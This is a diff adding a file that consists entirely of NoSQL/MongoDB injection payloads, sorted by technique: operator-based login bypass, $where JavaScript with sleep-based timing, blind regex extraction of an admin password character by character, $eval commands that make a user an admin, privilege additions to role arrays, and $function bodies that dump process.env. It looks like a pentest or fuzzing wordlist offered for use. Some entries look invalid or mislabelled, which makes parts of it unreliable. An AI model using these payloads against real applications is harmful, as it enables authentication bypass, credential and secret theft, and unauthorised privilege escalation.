@@ -1,0 +1,80 @@
+# Basic NoSQL injection payloads
+{"username": {"$ne": null}}
+{"username": {"$ne": ""}}
+{"username": {"$exists": true}}
+{"username": {"$in": ["admin", "administrator", "user", "root"]}}
+{"password": {"$regex": ".*"}}
+
+# MongoDB operators
+{"username": {"$gt": ""}}
+{"username": {"$gte": ""}}
+{"username": {"$lt": "z"}}
+{"username": {"$lte": "z"}}
+{"username": {"$nin": ["guest", "test", "normal"]}}
+{"username": {"$not": {"$eq": "guest"}}}
+
+# Logical operators
+{"$or": [{"username": "admin"}, {"username": "administrator"}]}
+{"$and": [{"username": "admin"}, {"password": {"$regex": "^p"}}]}
+{"$nor": [{"username": "guest"}, {"username": "test"}]}
+
+# JavaScript injection in MongoDB
+{"$where": "this.username == 'admin'"}
+{"$where": "this.password.length > 6"}
+{"$where": "this.username.match(/^admin/)"}
+{"$where": "function() { return this.username == 'admin'; }"}
+{"$where": "sleep(5000) || 1==1"}
+{"$where": "return Object.keys(this).length > 3"}
+
+# Array operators
+{"tags": {"$all": ["admin", "user"]}}
+{"tags": {"$size": 3}}
+{"tags.0": "admin"}
+{"tags": {"$elemMatch": {"$eq": "admin"}}}
+
+# Projection injection
+{"$project": {"password": 1}}
+{"$project": {"_id": 0, "username": 1, "password": 1}}
+{"$group": {"_id": null, "count": {"$sum": 1}}}
+
+# Aggregation framework
+{"$lookup": {"from": "users", "localField": "user_id", "foreignField": "_id", "as": "user_info"}}
+{"$unwind": "$user_info"}
+{"$sort": {"password": 1}}
+
+# Command injection
+{"$eval": "db.users.find({})"}
+{"$eval": "db.users.findOne({username: 'admin'})"}
+{"$eval": "db.users.update({username: 'test'}, {$set: {isAdmin: true}})"}
+
+# MongoDB specific
+{"$regex": "^admin"}
+{"$regex": "^admin", "$options": "i"}
+{"$regex": ".*admin.*"}
+{"$regex": ".*", "$options": "s"}
+
+# Blind NoSQL injection
+{"username": "admin", "password": {"$regex": "^a"}}
+{"username": "admin", "password": {"$regex": "^b"}}
+{"username": "admin", "password": {"$regex": "^c"}}
+{"username": "admin", "password": {"$regex": "^p"}}
+{"username": "admin", "password": {"$regex": "^pa"}}
+{"username": "admin", "password": {"$regex": "^pas"}}
+
+# Time-based blind NoSQL injection
+{"username": {"$where": "sleep(5000) || this.username == 'admin'"}}
+{"username": {"$where": "this.username == 'admin' ? sleep(5000) : 0"}}
+
+# Error-based NoSQL injection
+{"username": {"$toString": {"$error": "Intentional error"}}}
+{"username": {"$where": "this.username.match(/^admin/) || error()"}}
+
+# NoSQL injection with arrays
+{"$push": {"permissions": "admin"}}
+{"$addToSet": {"roles": "admin"}}
+{"$pull": {"restrictions": "read_only"}}
+
+# Advanced NoSQL injection
+{"username": {"$function": {"body": "function() { return db.getCollectionNames(); }"}}}
+{"username": {"$function": {"body": "function() { return db.users.findOne({username: 'admin'}); }"}}}
+{"username": {"$function": {"body": "function() { return process.env; }"}}}
